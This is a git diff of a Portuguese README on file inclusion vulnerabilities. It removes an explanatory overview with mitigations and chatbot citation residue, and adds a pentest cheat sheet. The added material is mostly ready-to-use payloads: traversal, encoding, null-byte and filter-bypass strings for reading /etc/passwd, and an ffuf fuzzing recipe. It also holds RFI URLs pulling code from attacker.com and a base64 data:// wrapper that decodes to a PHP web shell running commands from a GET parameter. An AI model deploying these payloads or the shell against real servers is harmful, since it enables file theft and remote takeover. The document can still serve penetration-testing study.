@@ -9,138 +9,143 @@ A vulnerabilidade de Local File Inclusion (LFI) surge da utilização insegura d
 
 ### RFI (Remote File Inclusion)
 
-Permite incluir e executar arquivos hospedados remotamente em servidores controlados pelo atacante, geralmente via URL como `http://attacker.com/shell.php` ([Invicti][3], [Imperva][4]).
+Permite incluir e executar arquivos hospedados remotamente em servidores controlados pelo atacante, geralmente via URL como `http://attacker.com/shell.php`.
+Quando uma função vulnerável nos permite incluir arquivos remotos, podemos hospedar um script malicioso e incluí-lo na página vulnerável para executar funções maliciosas e obter execução remota de código. No PHP é necessário que o parâmetro allow_url_include esteja habilitado, o padrão é estar desabilitado.
+
+:fries: Checklist
+- observe os campos das requisições em todos os métodos HTTP
+- observe nos campos das requisições o tipo de informação usada 
+- observe como a informação transmitida nos campos é processada
+- observe funções de upload
+- modifique o valor de um campo na requisição e observe como a aplicação responde
+- adicione no campo payloads de LFI
+- adicione no campo url para validar RFI
+- crie um arquivo com código executável e faça o upload na aplicação
+- procure acessar o arquivo para executar o código 
 
 ---
 
-## ⚙️ Técnicas Comuns de Exploração
+#### LFI Básico
+```
+http://example.com/index.php?page=../../../etc/passwd
+http://example.com/index.php?page=....//....//....//etc/passwd
+http://example.com/index.php?page=....\/....\/....\/etc/passwd
+http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
 
-### Traversal (Escalonamento de Diretórios)
-
-Uso de seqüências como `../../../../etc/passwd` ou encoded/truncation variations (ex: `....//....//etc/passwd`) para escapar do diretório raiz&#x20;
-.
-
-### Codificações e Encodings
-
-* **URL Encoding**: `..%2F..%2Fetc/passwd`
-* **Double Encoding**: `..%252F..%252Fetc`
-* **UTF‑8 truncation / meta:** `%c0%ae%c0%ae/etc/passwd` ([Exploit Notes][5], [HackTricks][6])
-
-### Null Byte (%00)
-
-Usado para truncar a extensão `.php` em aplicações vulneráveis (funciona em versões anteriores ao PHP 5.4) ([Exploit Notes][5], [Medium][7]).
-
-### Wrappers PHP (e.g. `php://filter`, `php://input`)
-
-* Extrair conteúdo de arquivos via base64 (`php://filter/read=convert.base64-encode/resource=index.php`)
-* Execution via `php://input` para LFI → RCE .
-
-### Log Poisoning / Inclusion de Arquivos de Log
-
-Inserção de payloads via user-agent ou parâmetros em logs do servidor (`/proc/self/environ`) e posterior inclusão através de LFI ([Medium][7], [Wikipedia][1]).
-
-### Upload de Arquivos Temporários
-
-Se uma vulnerabilidade de upload permitir a criação de arquivos temporários previsíveis, um LFI pode explorá-los antes que sejam excluídos ([HackTricks][6]).
-
----
-
-## 🛠 Ferramentas Utilizadas
-
-* **Fimap**: ferramenta para identificar e explorar LFI / RFI automaticamente ([HackTricks][6]).
-* Ferramentas de pentest como **Burp Suite**, **ZAP**, **Nessus**, e **Acunetix / Invicti**, capazes de detectar automaticamente pontos de inclusão de arquivos ([Number Analytics][8], [Invicti][2], [Invicti][3]).
-
----
-
-## 🚫 Prevenção e Mitigações
-
-### Validação de Entrada
-
-* **Utilize whitelist** de arquivos permitidos ao invés de aceitar qualquer valor do usuário ([Medium][7], [Invicti][2], [Invicti][3]).
-* Bloqueie ou filtre strings perigosas como `../`, `://` ou sequências codificadas.
-
-### Configurações seguras de PHP
-
-* **Desative `allow_url_include = Off`** (PHP ≥ 7.4 descontinuou essa funcionalidade) .
-* **Desative `allow_url_fopen`**, se possível.
-
-### Isolamento de Ambiente
-
-Hospede as aplicações em ambientes isolados (como Docker) para limitar o impacto de possíveis inclusões arbitrárias ([Invicti][2]).
-
-### Evitar Blacklists
-
-Blacklists e filtros são insuficientes — atacantes podem contornar rapidamente com técnicas de encoding ou wrappers ([Invicti][2], [Medium][7]).
-
----
-
-## 📋 Exemplos
-
-### Vulnerável em PHP:
-
-```php
-<?php
-$page = $_GET['page'];
-include("pages/$page");
-?>
 ```
 
-Ataque típico LFI:
+#### Null Byte (%00)
+Falha corrigida na versão PHP 5.4
+```http://example.com/index.php?page=../../../etc/passwd%00```
+
+#### Encoding
+```
+http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
+http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
+http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
+```
+
+#### LFI a partir de diretórios existentes
+```
+http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
+```
+
+### LFI exploit File System
+O sistema de arquivos de um servidor pode ser explorado recursivamente para identificar diretórios, não apenas arquivos, empregando certas técnicas. 
+Esse processo envolve determinar a profundidade do diretório e verificar a existência de pastas específicas.
+
+- depth of 3
+```
+http://example.com/index.php?page=../../../etc/passwd # depth of 3
+```
+- depth of 4
+Adicione o nome da pasta suspeita (por exemplo, private) à URL e navegue de volta para /etc/passwd.
+```
+http://example.com/index.php?page=private/../../../../etc/passwd # we went deeper down one level, so we have to go 3+1=4 levels up to go back to /etc/passwd
+```
+Para explorar diretórios em diferentes locais do sistema de arquivos, ajuste o payload. Por exemplo, para verificar se /var/www/ contém um diretório (assumindo que o diretório atual esteja a uma profundidade de 3), use:
+```
+http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
+```
+
+### Gerar wordlist de LFI a partir de uma wordlist existente
+```
+# 1
+sed 's_^_../../../var/www/_g' /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt | sed 's_$_/../../../etc/passwd_g' > payloads.txt
+
+# 2
+ffuf -u http://example.com/index.php?page=FUZZ -w payloads.txt -mr "root"
+```
+
+#### Path Trucation
+É um método empregado para manipular caminhos de arquivo em aplicações web. É frequentemente usado para acessar arquivos restritos, ignorando certas medidas de segurança que adicionam caracteres adicionais ao final dos caminhos de arquivo.
+```
+In PHP: /etc/passwd = /etc//passwd = /etc/./passwd = /etc/passwd/ = /etc/passwd/.
+Check if last 6 chars are passwd --> passwd/
+Check if last 4 chars are ".php" --> shellcode.php/.
+```
+```
+http://example.com/index.php?page=a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\.
+http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
+
+#With the next options, by trial and error, you have to discover how many "../" are needed to delete the appended string but not "/etc/passwd" (near 2027)
+# | Sempre testar adicionando um diretório falso a/ Essa vulnerabilidade foi corrigida no PHP 5.3
+
+http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
+http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
+```
+
+#### Filter Bypass
+```
+http://example.com/index.php?page=....//....//etc/passwd
+http://example.com/index.php?page=..///////..////..//////etc/passwd
+http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
+Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
+http://example.com/index.php?page=PhP://filter
+```
+
+### RFI
+```
+http://example.com/index.php?page=http://atacker.com/mal.php
+http://example.com/index.php?page=\\attacker.com\shared\mal.php
+```
+<p>Se por algum motivo allow_url_include estiver ativado, mas o PHP estiver filtrando o acesso a páginas externas, você pode usar, por exemplo, o wrapper data com base64 para decodificar um código PHP base64 e egt RCE:</p>
+[Ref.:] (https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/)
 
 ```
-/script.php?page=../../../../etc/passwd
+PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
+
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
 ```
 
-Ataque RFI (para servidores com `allow_url_include` ativado):
+### Parâmetro para testar LFI
+```
+?cat={payload}
+?dir={payload}
+?action={payload}
+?board={payload}
+?date={payload}
+?detail={payload}
+?file={payload}
+?download={payload}
+?path={payload}
+?folder={payload}
+?prefix={payload}
+?include={payload}
+?page={payload}
+?inc={payload}
+?locate={payload}
+?show={payload}
+?doc={payload}
+?site={payload}
+?type={payload}
+?view={payload}
+?content={payload}
+?document={payload}
+?layout={payload}
+?mod={payload}
+?conf={payload}
+```
 
-````
-/script.php?page=http://atacante.com/shell.php
-``` :contentReference[oaicite:14]{index=14}
 
----
-
-## 🔎 Fluxo Típico de Teste
-
-1. Identificar parâmetros passados para funções `include`, `require`, etc.
-2. Testar traversal simples e encoded payloads.
-3. Avaliar possibilidade de incluir arquivos de logs ou wrappers.
-4. Testar RFI em ambientes PHP configurados com `allow_url_include`.
-5. Automatizar com Fimap ou Burp Suite para descobertas escaláveis.
-6. Validar configurações de whitelist ou desabilitar inclusões dinâmicas.
-
----
-
-## ✅ Resumo
-
-| Tipo    | Finalidade               | Risco principal                            |
-|---------|---------------------------|--------------------------------------------|
-| **LFI** | Inclusão de arquivos locais | Vazamento de dados ou escalation para RCE |
-| **RFI** | Inclusão de arquivos remotos | Execução arbitrária de código no servidor  |
-
-### Mitigação:
-- Whitelist de valores permitidos
-- Desativar features de include remoto
-- Usar práticas sólidas de validação e codificação segura
-
----
-
-## 🧠 Referências
-
-- HackTricks: File Inclusion / Path traversal – técnicas e payloads para LFI/RFI :contentReference[oaicite:15]{index=15}  
-- Invicti / Spanning / Imperva – definições, riscos e mitigação de LFI/RFI :contentReference[oaicite:16]{index=16}  
-- Wikipedia e Exploit‑Notes – exemplos técnicos e encodings comuns :contentReference[oaicite:17]{index=17}
-
----
-
-Se quiser que torne esse README mais detalhado (com payloadlists ou scripts), posso expandir!
-::contentReference[oaicite:18]{index=18}
-````
-
-[1]: https://en.wikipedia.org/wiki/File_inclusion_vulnerability?utm_source=chatgpt.com "File inclusion vulnerability"
-[2]: https://www.invicti.com/learn/local-file-inclusion-lfi/?utm_source=chatgpt.com "Local File Inclusion (LFI) - Invicti"
-[3]: https://www.invicti.com/learn/remote-file-inclusion-rfi/?utm_source=chatgpt.com "Remote File Inclusion (RFI) - Invicti"
-[4]: https://www.imperva.com/learn/application-security/rfi-remote-file-inclusion/?utm_source=chatgpt.com "What is RFI | Remote File Inclusion Example & Mitigation Methods"
-[5]: https://exploit-notes.hdks.org/exploit/web/security-risk/file-inclusion/?utm_source=chatgpt.com "File Inclusion (LFI/RFI) - Exploit Notes"
-[6]: https://hacktricks.boitatech.com.br/pentesting-web/file-inclusion?utm_source=chatgpt.com "File Inclusion/Path traversal - HackTricks - Boitatech"
-[7]: https://medium.com/%40Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601?utm_source=chatgpt.com "Local File Inclusion (LFI) — Web Application Penetration Testing"
-[8]: https://www.numberanalytics.com/blog/file-inclusion-exploitation-penetration-testing?utm_source=chatgpt.com "File Inclusion Exploitation: A Penetration Tester's Guide"
